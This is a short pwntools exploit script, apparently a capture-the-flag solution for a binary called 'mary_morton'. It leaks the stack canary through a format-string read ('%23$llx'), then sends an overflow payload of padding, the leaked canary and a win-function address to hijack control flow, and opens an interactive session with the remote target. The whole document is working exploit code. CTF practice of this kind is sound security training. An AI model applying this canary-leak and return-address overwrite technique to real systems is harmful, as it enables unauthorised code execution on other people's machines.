#!/usr/bin/env python3

from pwn import *

exe = ELF("./mary_morton")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    OVERFLOW = "1"
    FSB = "2"
    EXIT = "3"

    win_func = 0x004008da

    r.sendline("2")
    r.sendline("%23$llx")
    canary = int(r.recvuntil("00")[-16:], 16)

    r.sendline(OVERFLOW)
    r.sendline("A" * (0x90 - 8) + p64(canary) + "B" * 8 + p64(win_func))
    r.interactive()


if __name__ == "__main__":
    main()
